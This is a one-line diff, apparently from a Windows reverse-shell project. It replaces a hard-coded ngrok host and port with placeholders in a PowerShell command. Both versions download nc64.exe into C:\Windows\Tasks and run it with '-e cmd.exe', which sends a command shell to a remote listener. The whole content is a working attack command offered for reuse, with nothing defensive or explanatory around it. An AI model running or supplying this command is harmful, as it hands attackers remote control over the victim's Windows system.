@@ -1,1 +1,1 @@
-start powershell Invoke-WebRequest https://github.com/Mikusho/Simple-Reverse-Shell-Windows/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe 0.tcp.ap.ngrok.io 17360
+start powershell Invoke-WebRequest https://github.com/Mikusho/Simple-Reverse-Shell-Windows/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe Put-Your-NgrokIP-Here Ngrok-PORT-Here
